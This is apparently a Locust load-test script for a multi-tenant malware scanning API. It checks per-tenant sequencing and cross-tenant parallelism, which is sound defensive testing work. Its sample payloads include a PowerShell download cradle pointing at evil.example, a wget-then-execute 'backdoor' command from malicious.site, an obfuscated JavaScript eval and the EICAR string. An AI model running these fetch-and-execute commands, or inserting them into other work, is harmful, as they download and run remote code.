"""
Locust load test for the malware scanning pipeline.

Demonstrates:
  - Sequential execution per tenant (same tenant_id → tasks processed one at a time)
  - Parallel execution across tenants (different tenant_ids run concurrently)

Run with:
  locust -f locust_tests/locustfile.py --host http://localhost:8000 \
         --users 20 --spawn-rate 5 --run-time 60s --headless

Or open the Locust UI at http://localhost:8089:
  locust -f locust_tests/locustfile.py --host http://localhost:8000
"""
import random
import string

from locust import HttpUser, between, task

# A small, fixed pool of tenant IDs.
# Multiple concurrent users sharing the same tenant_id will demonstrate
# the sequential-per-tenant constraint in worker logs.
TENANT_POOL = [f"tenant_{i:03d}" for i in range(1, 6)]  # tenant_001 .. tenant_005

# Sample payloads — some clean, some triggering YARA rules
PAYLOADS = [
    # Clean
    "Hello, this is a completely harmless text payload with no threats.",
    "SELECT * FROM users WHERE id = 1;",
    "The quick brown fox jumps over the lazy dog.",
    # Triggers PowerShellDownloadCradle
    "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload')",
    # Triggers ObfuscatedJavaScript
    "eval(unescape('%66%75%6E%63%74%69%6F%6E'))",
    # Triggers SuspiciousNetworkIndicators
    "wget http://malicious.site/backdoor && /bin/sh backdoor",
    # Triggers ClassicEicarTest
    r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
]


class ScannerUser(HttpUser):
    """
    Simulates a client submitting scan requests.

    Each virtual user picks a random tenant from the fixed pool,
    which means multiple users will naturally share the same tenant_id,
    exercising the sequential-per-tenant lock.
    """

    wait_time = between(0.1, 0.5)

    def on_start(self):
        # Each user is assigned a fixed tenant for the session so logs show
        # contention clearly.  Change to random.choice inside @task for pure
        # random distribution.
        self.tenant_id = random.choice(TENANT_POOL)

    @task(3)
    def submit_scan(self):
        payload = random.choice(PAYLOADS)
        with self.client.post(
            "/scan",
            json={"tenant_id": self.tenant_id, "payload_text": payload},
            catch_response=True,
        ) as resp:
            if resp.status_code == 202:
                resp.success()
                data = resp.json()
                # Optionally poll for the result (disabled to keep load simple)
                # self._poll_result(data["scan_result_id"])
            else:
                resp.failure(f"Unexpected status {resp.status_code}: {resp.text}")

    @task(1)
    def submit_scan_different_tenant(self):
        """
        Explicitly uses a *different* tenant to demonstrate cross-tenant parallelism.
        """
        other_tenant = random.choice(
            [t for t in TENANT_POOL if t != self.tenant_id] or TENANT_POOL
        )
        with self.client.post(
            "/scan",
            json={
                "tenant_id": other_tenant,
                "payload_text": random.choice(PAYLOADS),
            },
            catch_response=True,
        ) as resp:
            if resp.status_code == 202:
                resp.success()
            else:
                resp.failure(f"Unexpected status {resp.status_code}: {resp.text}")

    @task(1)
    def health_check(self):
        self.client.get("/health")
